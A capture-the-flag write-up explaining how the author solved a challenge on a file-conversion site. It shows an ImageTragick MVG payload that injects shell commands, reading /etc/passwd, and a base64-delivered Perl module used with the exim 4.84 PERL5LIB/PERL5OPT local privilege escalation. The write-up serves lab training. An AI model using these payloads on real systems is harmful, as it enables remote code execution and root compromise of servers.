# Realist

## Imagic

In this challenge, we have the site which allows for the files (pdf, jpg and mvg) to be uploaded and converted to another format. As the ImageMagic is used on the site, we can use the "ImageTragic" exploit to achive code execution on the system.

To test if the command execution work on the site, I've created a simple file which contained:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";ls")'
pop graphic-context
```

the `ls` is the part where any command can be run. As this worked, I've started standard scoping to find the privesc

the `cat /etc/passwd` showed user called `john`

in John's home directory we found a file called `exim4.conf.template` what indicates that exim4 is running on the system. 

Using `which exim` we could locate the program's location (`/usr/sbin/exim`) and then check the version by using `/usr/sbin/exim --version`. The version running on the system is `4.84 #2 built`.

Based on that we found the Local Privilege Escalation vulnerability `https://www.exploit-db.com/exploits/39535` 

As we didnt have a proper shell, the easiest way to deliever the payload was to create a `.pl` file on the system using previoustly found command execution and then run it using previoustly discovered vulnerability 

The payload whill read the `/pass` file and output its content to the `/tmp/pass.txt`

```
package root;
use strict;
use warnings;

system("cat /passwd > /tmp/pass.txt");
```

As the file contain multiple line brakes, we base64 encoded the payload for easier transfer

`cGFja2FnZSByb290Owp1c2Ugc3RyaWN0Owp1c2Ugd2FybmluZ3M7CgpzeXN0ZW0oImNhdCAvcGFzc3dkID4gL3RtcC9wYXNzLnR4dCIpOw==`

Then we passwed the payload to the victim's machine using below command.

`echo "cGFja2FnZSByb290Owp1c2Ugc3RyaWN0Owp1c2Ugd2FybmluZ3M7CgpzeXN0ZW0oImNhdCAvcGFzc3dkID4gL3RtcC9wYXNzLnR4dCIpOw==" > /tmp/root.base64`

After confirming that the file was created, I decoded the content of the file and saved it to the new file using this command:
`cat /tmp/root.base64 | base64 -d > /tmp/root.pm`

Then I just run the payload file uning below comand:

`PERL5LIB=/tmp PERL5OPT=-Mroot /usr/sbin/exim -ps`

If everything worked well, we should be able to find a new file in the /tmp directory called `pass.txt` which contains the flag
